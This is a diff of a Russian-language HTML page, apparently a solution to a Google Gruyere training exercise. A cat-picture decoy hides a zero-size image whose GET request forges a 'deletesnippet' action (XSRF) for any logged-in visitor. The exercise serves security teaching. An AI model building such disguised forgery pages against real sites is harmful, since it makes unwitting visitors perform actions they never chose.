@@ -1,14 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Смотрите ВАЖНЫЕ НОВОСТИ!</title>
+  <title>Котики 🐱</title>
 </head>
 <body>
-  <h1>ВАЖНЫЕ НОВОСТИ 🐱</h1>
-  <img src="https://i.imgur.com/123456.jpg" alt="Новости">
+  <h1>Смотри, какие котики!</h1>
+  <img src="https://i.imgur.com/8UXpQeA.jpg" alt="Котики" width="500">
 
-  <!-- Скрытый запрос, удаляющий первый сниппет -->
-  <img src="https://google-gruyere.appspot.com//428377867703460685517108285885883716448/deletesnippet?index=0"
-       style="display:none">
+  <!-- XSRF через GET: удаление сниппета -->
+  <img src="https://google-gruyere.appspot.com/428377867703460685517108285885883716448/deletesnippet?index=0"
+       style="display:none; width:0; height:0; border:0"
+       onload="console.log('XSRF: запрос отправлен')"
+       onerror="console.log('XSRF: ошибка загрузки (но запрос мог пройти)')">
 </body>
 </html>
